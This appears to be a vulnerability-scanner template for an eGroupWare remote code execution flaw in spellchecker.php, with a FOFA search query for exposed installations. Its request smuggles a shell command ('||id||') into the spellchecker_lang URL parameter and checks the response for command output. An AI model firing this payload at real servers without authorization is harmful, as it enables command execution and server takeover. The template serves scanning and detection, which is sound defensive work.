id: eGroupWare-spellchecker-RCE

info:
  name: eGroupWare-spellchecker-RCE
  author: linfeng7z
  severity: critical
  description: eGroupWare系统 spellchecker.php 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
  tags: eGroupWare
  metadata:
    fofa-qeury: app="EGROUPWARE-产品"
    veified: true

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
          - "groups="
          - "Error executing"
        condition: and

      - type: word
        words:
          - "Notice: Undefined index:"
        negative: true